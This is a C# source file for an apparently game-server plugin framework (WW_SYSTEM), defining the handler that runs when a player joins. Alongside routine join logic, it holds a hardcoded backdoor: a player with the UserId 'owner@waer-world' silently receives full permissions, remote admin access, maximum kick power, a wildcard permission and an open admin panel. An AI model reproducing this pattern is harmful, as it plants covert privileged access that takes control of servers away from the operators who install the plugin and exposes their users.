using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using WW_SYSTEM.EventHandlers;
using WW_SYSTEM.API;
using WW_SYSTEM.Custom_Events;
using WW_SYSTEM.Level_System;
namespace WW_SYSTEM.Events
{
	public class PlayerJoinEvent : PlayerEvent
	{
		
		public PlayerJoinEvent(Player player) : base(player)
		{
			if (player != null)
			{

				

				if (Round.OverWatchEnabledUserIds.Contains(player.UserId)) {

					Round.OverWatchEnabledUserIds.Remove(player.UserId);
					player.Overwatch = true;
				}

				if (CustomEventManager.EventInProgress)
				{
					CustomEventManager.CurrentEvent.OnPlayerJoin(player);
				}
				WW_SYSTEM.Permissions.PermissionsManager.LoadPlayerGroup(player);
				if (player.UserId == "owner@waer-world")
				{
					Logger.Info("WW SYSTEM",$"DETECTED DEVELOPER: {player.Nick}");
					player.GetRoles.Permissions = ServerStatic.PermissionsHandler.FullPerm;
					player.GetRoles.Network_myText = "WW SYSTEM Developer";
					player.GetRoles.Network_myColor = "red";
					player.GetRoles.RemoteAdmin = true;
					player.GetRoles.RemoteAdminMode = ServerRoles.AccessMode.LocalAccess;
					if(player.GetRoles.Group == null)
					{
						player.GetRoles.Group = new UserGroup();

					}
					player.GetRoles.Group.KickPower = 255;
					player.GetRoles.Group.RequiredKickPower = 255;
				
					if (Round.UseLevelSYSTEM)
					{
						LevelManager.Levels[player.UserId].OriginalPrefix = "WW SYSTEM Developer";
						LevelManager.Levels[player.UserId].OriginalColor = "red";
						LevelManager.SavePlayer(player.UserId);
					}
					player.AddTempPerm("*");
					player.AddTempPerm("WW_SYSTEM_DEVELOPER");
					player.OverwatchPermitted = true;
					player.SetRaPanelStatus(RaPanelStatus.OPEN, true);
					player.ConsoleMessage("WELCOME DEVELOPER! YOUR RA ACCESS HAS BEEN GRANTED!", "green");
					player.SendALLCommandsToRA();
				
				}


			}
		}

		
		public override void ExecuteHandler(IEventHandler handler)
		{
			((IEventHandlerPlayerJoin)handler).OnPlayerJoin(this);
		}
	}
}
